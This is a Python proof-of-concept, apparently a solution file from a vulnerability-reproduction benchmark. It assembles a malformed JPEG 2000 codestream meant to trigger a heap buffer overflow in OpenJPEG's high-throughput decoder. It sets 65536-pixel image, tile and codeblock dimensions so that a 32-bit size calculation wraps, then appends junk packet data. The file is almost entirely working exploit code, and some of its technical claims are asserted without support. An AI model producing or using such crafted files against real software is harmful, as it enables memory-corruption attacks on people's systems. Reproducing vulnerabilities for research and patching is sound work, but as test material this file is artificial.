import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a J2K codestream that triggers a heap buffer overflow in opj_t1_allocate_buffers (HT_DEC).
        # The vulnerability is an integer overflow in the buffer size calculation: w * h.
        # If w and h are 65536 (2^16), w*h = 0 in 32-bit arithmetic.
        # This results in a small allocation, followed by out-of-bounds writes during decoding.
        
        # 1. SOC (Start of Codestream)
        SOC = b'\xff\x4f'

        # 2. SIZ (Image and Tile Size)
        # We set image and tile dimensions to 65536x65536 to support the large codeblock.
        Xsiz = 65536
        Ysiz = 65536
        XTsiz = 65536
        YTsiz = 65536
        
        # Rsiz=0, Image Size, Image Offset(0,0), Tile Size, Tile Offset(0,0), Csiz=1
        siz_params = [
            0,                  # Rsiz (Capabilities) - standard, HT signaled in COD
            Xsiz, Ysiz,         # Xsiz, Ysiz
            0, 0,               # XOsiz, YOsiz
            XTsiz, YTsiz,       # XTsiz, YTsiz
            0, 0,               # XTOsiz, YTOsiz
            1                   # Csiz (1 component)
        ]
        siz_body = struct.pack('>HIIIIIIIIH', *siz_params)
        # Component parameters: Ssiz=7 (8-bit), XRsiz=1, YRsiz=1
        comp_params = b'\x07\x01\x01'
        
        SIZ = b'\xff\x51' + struct.pack('>H', len(siz_body) + len(comp_params) + 2) + siz_body + comp_params

        # 3. COD (Coding Style)
        # We need to trigger the HT decoder and set a large codeblock size.
        # Scod=0 (Entropy coding only)
        # SGcod: Prog=0 (LRCP), Layers=1, MCT=0
        # SPcod: Decomp=1, xcb=14, ycb=14, Style=0x40 (HT), Trans=0
        # xcb=14 -> Width = 2^(14+2) = 2^16 = 65536
        # ycb=14 -> Height = 2^(14+2) = 2^16 = 65536
        # Style 0x40 enables High Throughput (HT) decoding path.
        
        cod_body = b'\x00' + \
                   b'\x00\x01\x00\x00' + \
                   b'\x01\x0e\x0e\x40\x00'
                   
        COD = b'\xff\x52' + struct.pack('>H', len(cod_body) + 2) + cod_body

        # 4. QCD (Quantization Default)
        # No quantization (Guard=0), 4 subbands (LL, HL, LH, HH for 1 level)
        qcd_body = b'\x00' + b'\x00\x00\x00\x00'
        QCD = b'\xff\x5c' + struct.pack('>H', len(qcd_body) + 2) + qcd_body

        # 5. SOT (Start of Tile)
        # Tile index 0, length 0 (until end), part index 0, 1 tile part total
        sot_body = b'\x00\x00\x00\x00\x00\x00\x00\x01'
        SOT = b'\xff\x90' + struct.pack('>H', len(sot_body) + 2) + sot_body

        # 6. SOD (Start of Data) + Payload
        SOD = b'\xff\x93'
        
        # Payload: Junk data to simulate packet headers/data.
        # We need enough data to potentially trigger the packet parsing and subsequent T1 decoding attempt.
        # 0xAA pattern is non-zero, avoiding "empty packet" interpretation in some contexts.
        payload = b'\xAA' * 256

        # 7. EOC (End of Codestream)
        EOC = b'\xff\xd9'

        return SOC + SIZ + COD + QCD + SOT + SOD + payload + EOC